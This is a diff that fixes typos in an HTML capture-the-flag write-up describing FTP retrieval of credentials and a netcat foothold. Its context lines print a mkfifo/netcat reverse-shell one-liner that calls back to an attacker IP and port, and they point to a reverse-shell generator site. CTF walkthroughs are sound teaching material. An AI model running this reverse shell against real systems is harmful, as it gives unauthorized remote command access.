@@ -372,7 +372,7 @@ local: note.txt remote: note.txt
 <span style="color:#ae81ff">226</span> Transfer complete.
 <span style="color:#ae81ff">162</span> bytes received in 0.00 secs <span style="color:#f92672">(</span>53.0171 kB/s<span style="color:#f92672">)</span>
 ftp&gt; 
-</code></pre></div><p>Reading the note, we get a new port, and the username:passord to login!</p>
+</code></pre></div><p>Reading the note, we get a new port, and the username:password to login!</p>
 <h2 id="foothold---flag-1">Foothold - Flag 1</h2>
 <p>Unluckily it&rsquo;s not the SSH port, it&rsquo;s an &ldquo;internal shell service&rdquo;&hellip;</p>
 <p>Let&rsquo;s use <code>netcat</code> to login</p>
@@ -399,7 +399,7 @@ drwxr-xr-x  <span style="color:#ae81ff">2</span>    <span style="color:#ae81ff">
 drwxr-xr-x  <span style="color:#ae81ff">2</span>    <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">4096</span> Apr  <span style="color:#ae81ff">2</span> 20:56 opt
 drwxr-xr-x  <span style="color:#ae81ff">2</span>    <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">4096</span> Apr  <span style="color:#ae81ff">3</span> 01:35 tmp
 drwxr-xr-x  <span style="color:#ae81ff">4</span>    <span style="color:#ae81ff">0</span>    <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">4096</span> Apr  <span style="color:#ae81ff">2</span> 22:43 usr
-</code></pre></div><p>We now have to get a reverse shell, I usde the mkfifo shell, you can use other one!
+</code></pre></div><p>We now have to get a reverse shell, I used the mkfifo shell, you can use other one!
 I recommend you to use <a href="https://revshells.com">revshells.com</a> to generate the commands for reverse shells. It&rsquo;s created and mantained by the CTF&rsquo;s community!</p>
 <p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.6.21 1337 &gt;/tmp/f</code></p>
 <p><img src="foothold.png" alt="Foothold"></p>
